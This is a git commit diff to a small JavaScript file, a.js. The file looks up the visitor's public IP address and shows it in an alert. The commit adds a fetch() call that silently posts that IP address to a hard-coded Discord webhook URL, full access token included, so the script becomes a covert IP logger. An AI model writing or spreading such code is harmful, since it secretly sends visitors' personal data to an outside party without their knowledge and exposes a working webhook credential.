98f77aa169350bdb315d5029180df32070dd7543
Uexodus <112518767+Uexodus@users.noreply.github.com>
2023-04-28 20:42:35 +0100

    Update a.js

--- a.js
+++ a.js
@@ -1,8 +1,17 @@
 var xmlHttp = new XMLHttpRequest();
 xmlHttp.open( "GET", "https://api.ipify.org/", false ); // false for synchronous request
 xmlHttp.send( null );
+
+
+
+fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4uEYJyyr1h4_ItLMgD3x6ZTyKB7EKsPRjqvpsmx_yZUAaO28K', {
+    method: 'POST',
+    headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
+})
+
 alert(xmlHttp.responseText)
-
-
-
 
